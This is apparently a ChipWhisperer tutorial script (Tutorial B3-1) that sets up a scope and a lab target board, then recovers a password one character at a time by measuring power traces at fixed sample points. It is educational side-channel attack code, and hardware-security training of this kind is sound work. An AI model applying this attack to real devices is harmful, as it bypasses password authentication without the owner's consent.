"""This script is an example of a timing attack on a simple password checker. 
It is the result of Tutorial B3-1 from the ChipWhisperer Wiki.
"""

import chipwhisperer as cw
from chipwhisperer.capture.auxiliary.ResetCW1173Read import ResetCW1173

# GUI compatibility
try:
    scope = self.scope
    target = self.target
    aux_list = self.aux_list
except NameError:
    pass
    
# Set up scope
scope.gain.gain = 45
scope.adc.samples = 2000
scope.adc.offset = 0
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 7370000
scope.clock.adc_src = "clkgen_x4"
scope.trigger.triggers = "tio4"
scope.io.tio1 = "serial_rx"
scope.io.tio2 = "serial_tx"
scope.io.hs2 = "clkgen"

# Set up target
target.key_cmd = ""
target.go_cmd = "h0px3\n"
target.output_cmd = ""

# Set up aux module to reset target before capture
resetter = ResetCW1173(xmega=True, delay_ms=1200)
aux_list.register(resetter.resetThenDelay, "before_trace")

# Test one capture
cw.captureN(self.scope, self.target, None, self.aux_list, self.ktp, 1)
trace = scope.getLastTrace()
print trace

# Crack the first letter
password = ''
trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'
  
for i in range(5):
    for c in trylist:
        # Get a power trace using our next attempt
        nextPass = password + '{}'.format(c) + "\n"
        target.go_cmd = nextPass
        cw.captureN(self.scope, self.target, None, self.aux_list, self.ktp, 1)
        
        # Grab the trace
        nextTrace = scope.getLastTrace()
        
        # Check location 153, 225, etc. If it's too low, we've failed
        if nextTrace[153 + 72*i] < -0.2:
            continue
            
        # If we got here, we've found the right letter
        password += c
        print '{} characters: {}'.format(i+1, password)
        break